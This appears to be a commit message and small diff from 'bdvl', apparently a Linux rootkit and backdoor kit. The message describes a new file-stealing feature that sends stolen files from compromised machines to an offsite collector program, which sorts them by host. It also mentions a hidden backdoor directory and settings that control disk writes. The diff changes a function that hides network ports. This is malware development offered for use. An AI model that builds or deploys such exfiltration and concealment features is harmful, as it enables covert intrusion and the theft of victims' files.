New FILE_STEAL method & tidying up code
There is now an option in bdvl
for prioritising sending stolen
files somewhere offsite. I have
created etc/hoarder.c which
handles files received & writes
files from each connected box,
into their own directory.
etc/hoarder.c has a few options
as to how it runs... daemonizing
it isn't something it does itself,
but might be in the next commit.

In setup.py there is STOLEN_STORE.
See this for comments. There is
also a part in the README which
mentions what this is for.

If NO_DISK_WRITE in setup.py is
True, and if the file contents
cannot be sent for any reason,
the file will not be copied into
the dedicated hidden directory.

If you specify, in setup.py,
somewhere to try to send files
to, you will be able to change
it later on while in the kit's
backdoor home directory. It is
available as a symlink.

bdvl's bdvupdate function has had
a touchup as of the last commit.

Other minor changes too...

+++ inc/util/hiding/hiding.h
@@ -21,7 +21,7 @@ FILE *forge_numamaps(const char *pathname);
 #endif
 
 #ifdef HIDE_PORTS
-int is_hidden_port(int port);
+int is_hidden_port(unsigned short port);
 #ifdef HIDE_ADDRS
 char *getanip(const char *addr);
 int is_hidden_addr(const char *addr);
